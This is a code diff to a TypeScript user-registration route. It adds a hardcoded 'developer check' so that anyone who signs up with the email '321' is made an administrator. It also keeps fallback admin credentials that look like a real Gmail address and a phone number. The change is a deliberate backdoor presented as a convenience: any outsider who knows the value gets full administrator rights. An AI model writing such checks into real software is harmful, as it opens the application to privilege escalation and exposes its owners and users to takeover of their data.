@@ -46,7 +46,10 @@ export async function POST(req: Request) {
     const adminEmail = process.env.ADMIN_EMAIL?.toLowerCase() || 'tymlghby@gmail.com';
     const adminUsername = process.env.ADMIN_USERNAME || '0501645063';
     
-    const role = (email.toLowerCase() === adminEmail || effectiveUsername === adminUsername) ? 'ADMIN' : 'USER';
+    // ⭐ SPECIAL DEVELOPER CHECK ('321' Email)
+    const isDeveloper = email.toLowerCase() === '321' || email.toLowerCase() === adminEmail || effectiveUsername === adminUsername;
+    const role = isDeveloper ? 'ADMIN' : 'USER';
+
     const newUser = await prisma.user.create({
       data: {
         username: effectiveUsername,
